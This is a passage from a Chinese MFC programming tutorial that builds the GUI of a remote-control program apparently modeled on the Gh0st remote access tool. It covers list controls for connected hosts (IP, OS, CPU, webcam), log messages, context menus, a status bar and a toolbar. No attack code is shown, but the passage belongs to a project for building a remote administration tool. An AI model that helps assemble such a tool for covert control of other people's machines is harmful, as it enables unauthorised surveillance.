&#123;</span><br><span class="line">			<span class="keyword">double</span> dd = Array_Column_Message[i].nWidth;     <span class="comment">//得到当前列的宽度</span></span><br><span class="line">			dd /= Column_Message_lenth;                    <span class="comment">//看一看当前宽度占总长度的几分之几</span></span><br><span class="line">			dd *= dcx;                                       <span class="comment">//用原来的长度乘以所占的几分之几得到当前的宽度</span></span><br><span class="line">			<span class="keyword">int</span> NewWidth = (<span class="keyword">int</span>)dd;                                   <span class="comment">//转换为int 类型</span></span><br><span class="line">			m_CList_Message.SetColumnWidth(i, NewWidth);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>阶段成果展示<br><img src="https://s2.loli.net/2022/04/08/gdAB9X3p67TwsEr.png"><br>缩小一点看看。<br><img src="https://s2.loli.net/2022/04/08/VLvTqm5zCUoPxkg.png"></p>
<h3 id="添加行信息"><a href="#添加行信息" class="headerlink" title="添加行信息"></a>添加行信息</h3><p>这部分主要是学习如何向列表中添加行信息。</p>
<p>需要使用到<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#insertitem">InsertItem</a>，向列表视图控件中插入项。然后向子列中加入或修改数据，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#insertitem">SetItemText</a>，更改列表视图项或子项的文本。</p>
<pre><code>int InsertItem(
    int nItem,   //要插入的项的索引。第几行
    LPCTSTR lpszItem);   //包含项标签的字符串的地址，简单说就是第0列的数据


BOOL SetItemText(
    int nItem,   //要插入的项的索引。第几行
    int nSubItem,  //第几个子列
    LPCTSTR lpszText);   //数据</code></pre>
<p>我们先对Online列表写一个添加数据的函数。由于有7个子列，我们传入7个字符型参数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	ONLINELIST_IP = <span class="number">0</span>,          <span class="comment">//IP的列顺序</span></span><br><span class="line">	ONLINELIST_ADDR,          <span class="comment">//地址</span></span><br><span class="line">	ONLINELIST_COMPUTER_NAME, <span class="comment">//计算机名/备注</span></span><br><span class="line">	ONLINELIST_OS,           <span class="comment">//操作系统</span></span><br><span class="line">	ONLINELIST_CPU,          <span class="comment">//CPU</span></span><br><span class="line">	ONLINELIST_VIDEO,       <span class="comment">//摄像头</span></span><br><span class="line">	ONLINELIST_PING          <span class="comment">//PING</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_Online_Message</span><span class="params">(LPCTSTR strIP, LPCTSTR strAddr, LPCTSTR strPCName, LPCTSTR strOS, LPCTSTR strCPU, LPCTSTR strVideo, LPCTSTR strPing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	m_CList_Online.InsertItem(<span class="number">0</span>, strIP);<span class="comment">//先插入第一个子列的信息，默认都是第一行，也就是第一项，确保每当有新设备上线，总是在第一行。</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//为其他子列添加数据，这里使用了枚举变量，在简化代码的同时，也能更好的扩展</span></span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_ADDR, strAddr);     </span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_COMPUTER_NAME, strPCName); </span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_OS, strOS);</span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_CPU, strCPU);</span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_VIDEO, strVideo);</span><br><span class="line">	m_CList_Online.SetItemText(<span class="number">0</span>, ONLINELIST_PING, strPing);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里主要是讲一下为什么要使用枚举变量，我们先假设不使用枚举变量。那么我们添加数据的代码将如下。</p>
<pre><code>m_CList_Online.SetItemText(0, 1, strAddr);
m_CList_Online.SetItemText(0, 2, strPCName);
m_CList_Online.SetItemText(0, 3, strOS);
m_CList_Online.SetItemText(0, 4, strCPU);
m_CList_Online.SetItemText(0, 5, strVideo);
m_CList_Online.SetItemText(0, 6, strPing);</code></pre>
<p>然后假设我们现在要删除计算机名称这一列，我们就必须删除删除InitList中的创建代码和修改2后面的所有行。</p>
<p>但是如果使用枚举变量，我们就只用删除InitList中的创建代码和下面的两句话，不用对代码做出太大的改动。</p>
<pre><code>ONLINELIST_COMPUTER_NAME, //计算机名/备注

m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName); </code></pre>
<p>同理我们对日志消息列表写一个添加数据的函数，由于变量太少，就不采用枚举了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//添加日志的部分信息</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_Log_Message</span><span class="params">(BOOL IsSuccess, LPCTSTR strLogMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CString strTime, strIsSuccess;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取当前时间</span></span><br><span class="line">	CTime t = CTime::GetCurrentTime();</span><br><span class="line">	strTime = t.Format(<span class="string">&quot;%H:%M:%S&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (IsSuccess)</span><br><span class="line">	&#123;</span><br><span class="line">		strIsSuccess = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		strIsSuccess = <span class="string">&quot;Failed&quot;</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	m_CList_Message.InsertItem(<span class="number">0</span>, strIsSuccess);</span><br><span class="line">	m_CList_Message.SetItemText(<span class="number">0</span>, <span class="number">1</span>, strTime);</span><br><span class="line">	m_CList_Message.SetItemText(<span class="number">0</span>, <span class="number">2</span>, strLogMsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后产生了一个问题，插入数据时都是先InsertItem插入第一个子列，SetItemText后面的子列，不能全部使用SetItemText。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013050589/article/details/20704625">https://blog.csdn.net/u013050589/article/details/20704625</a><br>看了文章后，发现说简单点，就是必须先要申请了行，才可以向后面的子列添加数据，并且在申请行的同时，可以对第一个子列进行赋值。随后我又测试了几组数据。</p>
<pre><code>m_CList_Message.InsertItem(0, strIsSuccess);
m_CList_Message.SetItemText(0, 1, strTime);
m_CList_Message.SetItemText(0, 2, strLogMsg);
m_CList_Message.InsertItem(1, strIsSuccess);
m_CList_Message.SetItemText(1, 1, strTime);
m_CList_Message.SetItemText(1, 2, strLogMsg);

Success  time  xxx
Success  time  xxx

//m_CList_Message.InsertItem(0, strIsSuccess);
//m_CList_Message.SetItemText(0, 1, strTime);
//m_CList_Message.SetItemText(0, 2, strLogMsg);
m_CList_Message.InsertItem(1, strIsSuccess);
m_CList_Message.SetItemText(1, 1, strTime);
m_CList_Message.SetItemText(1, 2, strLogMsg);

Success

m_CList_Message.InsertItem(0, strIsSuccess);
//m_CList_Message.SetItemText(0, 1, strTime);
//m_CList_Message.SetItemText(0, 2, strLogMsg);
m_CList_Message.InsertItem(1, strIsSuccess);
m_CList_Message.SetItemText(1, 1, strTime);
m_CList_Message.SetItemText(1, 2, strLogMsg);

Success
Success  time  xxx</code></pre>
<p>可以发现似乎不能跳过前面的行，直接对某一行进行给数据。</p>
<p>然后写个测试函数，试试能不能使用这两个函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 测试是否能正常添加信息。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Add_Online_Message(<span class="string">&quot;192.168.0.1&quot;</span>, <span class="string">&quot;本机局域网&quot;</span>, <span class="string">&quot;Lang&quot;</span>, <span class="string">&quot;Windows7&quot;</span>, <span class="string">&quot;2.2GHZ&quot;</span>, <span class="string">&quot;有&quot;</span>, <span class="string">&quot;123232&quot;</span>);</span><br><span class="line">	Add_Log_Message(<span class="literal">true</span>, <span class="string">&quot;软件初始化成功...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后就是如果想点击时整个列都是选中状态，在InitList中添加下面代码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">m_CList_Online.SetExtendedStyle(LVS_EX_FULLROWSELECT);</span><br><span class="line"></span><br><span class="line">m_CList_Message.SetExtendedStyle(LVS_EX_FULLROWSELECT);</span><br></pre></td></tr></table></figure>

<p>阶段成果展示<br><img src="https://s2.loli.net/2022/04/08/OxbNEzonIPy3Sjk.png"></p>
<h3 id="给Online列表添加菜单栏"><a href="#给Online列表添加菜单栏" class="headerlink" title="给Online列表添加菜单栏"></a>给Online列表添加菜单栏</h3><p>首先需要添加一个菜单栏资源，资源视图-&gt;右键-&gt;添加资源-&gt;Menu。然后设计菜单，修改名称这些。</p>
<p>然后就是给Online列表设置一个右鼠标点击的事件处理函数，用来弹出菜单栏，只不过需要区别是否点击到有效项上。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Online列表界面内右键显示菜单栏</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnNMRClickOnline</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	CMenu	Menu;<span class="comment">//声明一个菜单变量</span></span><br><span class="line">	Menu.LoadMenuA(IDR_MENU_ONLINE);<span class="comment">//载入菜单资源</span></span><br><span class="line">	CMenu* pMenu = Menu.GetSubMenu(<span class="number">0</span>);<span class="comment">//得到菜单项</span></span><br><span class="line">	<span class="keyword">int</span> M_count = pMenu-&gt;GetMenuItemCount();<span class="comment">//得到菜单各个选项的个数</span></span><br><span class="line"></span><br><span class="line">	CPoint	Point;                           <span class="comment">//声明一个鼠标变量</span></span><br><span class="line">	GetCursorPos(&amp;Point);                    <span class="comment">//得到鼠标指针的位置</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//满足选中列表中的项数为0，项数可以理解为行数，就将菜单中的选项全部变灰，无法点击。</span></span><br><span class="line">	<span class="keyword">if</span> (m_CList_Online.GetSelectedCount() == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M_count; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//EnableMenuItem,启用、禁用或显示指定的菜单项。</span></span><br><span class="line">			pMenu-&gt;EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          <span class="comment">//菜单全部变灰</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//根据鼠标的位置来展示菜单栏</span></span><br><span class="line">	pMenu-&gt;TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, <span class="keyword">this</span>);</span><br><span class="line">	*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>阶段成果展示<br><img src="https://s2.loli.net/2022/04/09/4TmxHiQfyKRPFw9.png"><br>不选择项时，菜单选项全部为灰色<br><img src="https://s2.loli.net/2022/04/09/hxV5vb4cEzOfJ37.png"></p>
<h3 id="为菜单选项添加处理函数"><a href="#为菜单选项添加处理函数" class="headerlink" title="为菜单选项添加处理函数"></a>为菜单选项添加处理函数</h3><p>对于各个功能函数，现在肯定的无法添加具体代码的，只能添加一个测试代码，主要还是为断开连接，设计一个删除项的功能。</p>
<p>需要用到的两个函数。</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#deleteitem">deleteitem</a><br>从列表视图控件中删除项。</p>
<pre><code>BOOL DeleteItem(int nItem);

nItem
指定要删除的项的索引。</code></pre>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/clistctrl-class?view=msvc-170#getselectionmark">GetSelectionMark</a>检索列表视图控件的选择标记。</p>
<pre><code>int GetSelectionMark();

返回值：
从零开始的选择标记，如果没有选择标记，则为-1。</code></pre>
<p>如果是想全部删除可以采用下面的代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//获取列表中所有项的个数</span></span><br><span class="line"><span class="keyword">int</span> All_Count = m_CList_Online.GetItemCount();</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">//循环删除，每次都删除第一行，因为没删除一行，索引是会变的。</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; All_Count; i++)</span><br><span class="line">&#123;</span><br><span class="line">	m_CList_Online.DeleteItem(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们往往是想删除指定的行。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//删除选定项</span></span><br><span class="line"><span class="keyword">int</span> index= m_CList_Online.GetSelectionMark();</span><br><span class="line">m_CList_Online.DeleteItem(index);</span><br></pre></td></tr></table></figure>

<p>然后我们需要添加一个删除日志，日志消息需要是断开连接设备的ip信息，我们使用GetItemText来获取。注意获取ip信息需要在所选项删除前获取。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//断开连接</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnOnlineDelete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除所有项</span></span><br><span class="line">	<span class="comment">////获取列表中所有项的个数</span></span><br><span class="line">	<span class="comment">//int All_Count = m_CList_Online.GetItemCount();</span></span><br><span class="line">	<span class="comment">//int i;</span></span><br><span class="line">	<span class="comment">////循环删除，每次都删除第一行，因为没删除一行，索引是会变的。</span></span><br><span class="line">	<span class="comment">//for (i = 0; i &lt; All_Count; i++)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	m_CList_Online.DeleteItem(0);</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除选定项</span></span><br><span class="line">	CString strIp;</span><br><span class="line">	<span class="keyword">int</span> index= m_CList_Online.GetSelectionMark();</span><br><span class="line">	<span class="comment">//Ip信息必须在这一行删除之前获取</span></span><br><span class="line">	strIp = m_CList_Online.GetItemText(index, ONLINELIST_IP);</span><br><span class="line">	m_CList_Online.DeleteItem(index);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//添加日志消息</span></span><br><span class="line">	strIp += <span class="string">&quot;断开连接&quot;</span>;</span><br><span class="line">	Add_Log_Message(<span class="literal">true</span>, strIp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="添加主对话框菜单和部分处理函数"><a href="#添加主对话框菜单和部分处理函数" class="headerlink" title="添加主对话框菜单和部分处理函数"></a>添加主对话框菜单和部分处理函数</h3><p>还是需要先设计菜单。添加一个资源就行。</p>
<p>然后是展示菜单，这里使用的函数和之前Online的菜单有点不同。</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-loadmenua">LoadMenuA</a>，不是CMenu类中的LoadMenu。从与应用程序实例关联的可执行 （.exe） 文件中加载指定的菜单资源。</p>
<pre><code>HMENU LoadMenuA(
  [in, optional] HINSTANCE hInstance,  //包含要加载的菜单资源的模块的句柄。
  [in]           LPCSTR    lpMenuName  //菜单资源的名称。
);</code></pre>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setmenu">SetMenu</a>，将新菜单分配给指定的窗口。</p>
<pre><code>BOOL SetMenu(
  [in]           HWND  hWnd,  //要将菜单分配到的窗口的句柄。
  [in, optional] HMENU hMenu  //新菜单的句柄。
);</code></pre>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-drawmenubar">DrawMenuBar</a>，重绘指定窗口的菜单栏。</p>
<pre><code>BOOL DrawMenuBar(
  [in] HWND hWnd  //要重绘其菜单栏的窗口的句柄。
);</code></pre>
<p>这里添加一个函数去实现，使代码好看一点</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//为主对话窗口添加菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_Main_Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line">	HMENU	Main_Menu;<span class="comment">//声明一个菜单句柄</span></span><br><span class="line">	Main_Menu=LoadMenuA(<span class="literal">NULL</span>, MAKEINTRESOURCE(IDR_MENU_MAIN));<span class="comment">//载入菜单资源，使用MAKEINTRESOURCE宏转类型</span></span><br><span class="line">	::SetMenu(<span class="keyword">this</span>-&gt;GetSafeHwnd(), Main_Menu);  <span class="comment">//使用::代表不使用类中的重载函数。 分配新菜单到主对话框窗口</span></span><br><span class="line">	::DrawMenuBar(<span class="keyword">this</span>-&gt;GetSafeHwnd());  <span class="comment">//显示菜单</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就是添加菜单选项的消息处理函数了。</p>
<p>退出。PostMessage函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//退出选项处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::OnMainClose</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加命令处理程序代码</span></span><br><span class="line">	PostMessage(WM_CLOSE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就是关于了，实际上这个项目创建的时候，就生成了一个类已经有了这个函数，只需要我们去调用。需要做的就是根据自己的情况去修改下界面，ID为IDD_ABOUTBOX，然后类名为为CAboutDlg。</p>
<pre><code>//关于选项处理函数
void CMyRemoteDlg::OnMainAbout()
&#123;
    // TODO: 在此添加命令处理程序代码
    //调用已有的关于函数
    CAboutDlg AboutDlg;
    AboutDlg.DoModal();
&#125;</code></pre>
<p>阶段成品展示。<br><img src="https://s2.loli.net/2022/04/09/8u1iC3pA9ofXSOZ.png"></p>
<h3 id="添加状态栏"><a href="#添加状态栏" class="headerlink" title="添加状态栏"></a>添加状态栏</h3><p>在主窗口底部添加一个状态栏。</p>
<p>首先需要在Sting Table里面添加字符串。</p>
<p>然后定义数组，存放添加的字符串的ID，如果要多个状态栏就需要添加多个字符串。</p>
<pre><code>static UINT indicators[] = &#123; 
    IDR_STATUSBAR_STRING 
&#125;;</code></pre>
<p>然后直接上函数，基本上都是一套流程，需要提前定义一个状态栏变量StatusBar m_StatusBar。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//添加状态栏</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyRemoteDlg::Add_status_bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此处添加实现代码.</span></span><br><span class="line">	<span class="keyword">if</span> (!m_StatusBar.Create(<span class="keyword">this</span>) || !m_StatusBar.SetIndicators(indicators, <span class="keyword">sizeof</span>(indicators) / <span class="keyword">sizeof</span>(UINT)))</span><br><span class="line">	&#123;</span><br><span class="line">		TRACE0(<span class="string">&quot;Can&#x27;t create status bar\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	CRect rc;</span><br><span class="line">	<span class="comment">//检索状态栏的边界矩形的尺寸。</span></span><br><span class="line">	::GetWindowRect(m_StatusBar.m_hWnd, rc);</span><br><span class="line">	<span class="comment">//调整状态栏的位置和大小，但是实际上我们调用的是重载函数，实际上具体调整在Onsize函数中实现</span></span><br><span class="line">	m_StatusBar.MoveWindow(rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候我们，并没有设置好位置，但是没什么关系，我们在OnSize函数中设置下就行，还能随主窗口变换而变换。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使状态栏跟随主窗口变化而变化</span></span><br><span class="line"><span class="keyword">if</span> (m_StatusBar.m_hWnd != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	CRect rc;</span><br><span class="line">	rc.left = <span class="number">0</span>;</span><br><span class="line">	rc.top = cy - <span class="number">20</span>;</span><br><span class="line">	rc.right = cx;</span><br><span class="line">	rc.bottom = cy;</span><br><span class="line">	<span class="comment">//调整状态栏的位置</span></span><br><span class="line">	m_StatusBar.MoveWindow(rc);</span><br><span class="line">	<span class="comment">//设置为新的 ID、样式和宽度。</span></span><br><span class="line">	m_StatusBar.SetPaneInfo(<span class="number">0</span>, m_StatusBar.GetItemID(<span class="number">0</span>), SBPS_POPOUT, cx<span class="number">-10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要提一下的是SetPaneInfo函数，第一个参数就是那个数组的某个index，然后第二个参数可以通过GetItemID得到。</p>
<p>最后就是添加状态栏显示的内容了，我们需要显示的是当前连接的个数，然后显示的函数是<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/mfc/reference/cstatusbar-class?view=msvc-170#setpanetext">CStatusBar：：SetPaneText</a>，可以同过添加日志消息的那个函数的参数来得到个数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CString strStatusMsg;</span><br><span class="line"><span class="keyword">if</span> (strLogMsg.Find(<span class="string">&quot;上线&quot;</span>) &gt; <span class="number">0</span>)         <span class="comment">//处理上线还是下线消息</span></span><br><span class="line">&#123;</span><br><span class="line">	Online_Pc_Count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strLogMsg.Find(<span class="string">&quot;下线&quot;</span>) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Online_Pc_Count--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strLogMsg.Find(<span class="string">&quot;断开&quot;</span>) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Online_Pc_Count--;</span><br><span class="line">&#125;</span><br><span class="line">Online_Pc_Count = (Online_Pc_Count &lt;= <span class="number">0</span> ? <span class="number">0</span> : Online_Pc_Count);         <span class="comment">//防止iCount 有-1的情况</span></span><br><span class="line">strStatusMsg.Format(<span class="string">&quot;有%d个主机在线&quot;</span>, Online_Pc_Count);</span><br><span class="line">m_StatusBar.SetPaneText(<span class="number">0</span>, strStatusMsg);   <span class="comment">//在状态条上显示文字</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>阶段成果展示。<br><img src="https://s2.loli.net/2022/04/09/8I9qDJAGxCrYK3M.png"></p>
<h3 id="添加功能图标"><a href="#添加功能图标" class="headerlink" title="添加功能图标"></a>添加功能图标</h3><p>这部分最费力的还是制作自己个性化的图标。</p>
<p>先在资源创建一个ToolBar用来构造工具栏框架，这里是13个48*48的，9到10中间空一个，然后就是创建一个位图资源，用来做工具栏的底，要不然没图标，只有框，不好看，我这里是直接学着视频中的图片，做了个差不多的。</p>
<p>然后就是一系列操作了，这里视频中也是直接使用了Gh0st中的一个写好的类，我们直接用就行。</p>
<p>流程为：</p>
<ul>
<li>创造并加载工具栏，CreateEx，LoadToolBar</li>
<li>调用TrueColorToolBar.h提供的LoadTrueColorToolBar，用来加载分割位图资源，并且上色。</li>
<li>设置工具栏位置，RECT，MoveWindow</li>
<li>工具栏下方添加文字，SetButtonText</li>
<li>RepositionBars显示工具栏</li>
</ul>
<p>代码</p>
